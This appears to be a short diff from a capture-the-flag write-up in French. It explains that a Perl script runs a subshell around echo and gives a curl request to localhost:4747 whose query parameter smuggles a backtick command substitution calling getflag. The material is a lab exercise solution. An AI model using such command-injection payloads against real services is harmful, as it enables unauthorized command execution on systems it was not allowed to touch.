@@ -1,0 +1,3 @@
+Le script perl fait un subshell de echo et on lui donne un autre subshell avec getflag en param
+
+curl localhost:4747?x='`getflag`'
